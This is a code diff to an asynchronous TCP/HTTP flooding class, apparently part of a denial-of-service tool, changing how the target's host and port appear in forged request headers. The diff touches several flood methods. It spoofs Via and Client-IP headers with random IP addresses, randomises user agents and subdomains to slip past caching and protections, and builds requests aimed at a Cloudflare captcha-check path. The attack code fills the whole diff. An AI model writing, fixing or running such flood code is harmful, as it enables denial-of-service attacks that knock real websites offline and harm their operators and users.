@@ -147,11 +147,11 @@ class AsyncTcpFlood(FloodBase):
         origin = str(self._url.origin())
         headers = {
             **self.BASE_HEADERS,
-            "Host": self._url.raw_host,
+            "Host": self._url.raw_authority,
             "Origin": origin,
             "Referer": origin,  # emulate Referrer-Policy: origin
             "User-Agent": random.choice(USERAGENTS),
-            "X-Forwarded-Host": self._url.raw_host,
+            "X-Forwarded-Host": self._url.raw_authority,
             "Via": ip,
             "Client-IP": ip,
             "X-Forwarded-Proto": "https",
@@ -371,14 +371,14 @@ class AsyncTcpFlood(FloodBase):
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
-        payload = self.build_request(headers={"Host": self._url.raw_host})
+        payload = self.build_request(headers={"Host": self._url.raw_authority})
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers={
                 **self.default_headers(),
-                "Host": "%s.%s" % (Tools.rand_str(6), self._url.raw_host)
+                "Host": "%s.%s" % (Tools.rand_str(6), self._url.raw_authority)
             }
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
@@ -550,10 +550,10 @@ class AsyncTcpFlood(FloodBase):
         #      to do a hex here instead of just wrapping into str
         randhex: str = str(randbytes(random.choice([32, 64, 128])))
         packet = self.build_request(
-            path_qs=f'{self._url.raw_host}/{randhex}',
+            path_qs=f'{self._url.raw_authority}/{randhex}',
             headers={
                 **self.default_headers(),
-                "Host": f"{self._url.raw_host}/{randhex}"
+                "Host": f"{self._url.raw_authority}/{randhex}"
             }
         )
 
@@ -576,14 +576,14 @@ class AsyncTcpFlood(FloodBase):
         )
 
         p1: bytes = self.build_request(
-            path_qs=f'{self._url.raw_host}/{hexh}',
+            path_qs=f'{self._url.raw_authority}/{hexh}',
             headers={
                 **self.default_headers(),
-                "Host": f"{self._url.raw_host}/{hexh}"
+                "Host": f"{self._url.raw_authority}/{hexh}"
             }
         )
         p2: bytes = self.build_request(
-            path_qs=f'{self._url.raw_host}/cdn-cgi/l/chk_captcha',
+            path_qs=f'{self._url.raw_authority}/cdn-cgi/l/chk_captcha',
             headers={
                 **self.default_headers(),
                 "Host": hexh,
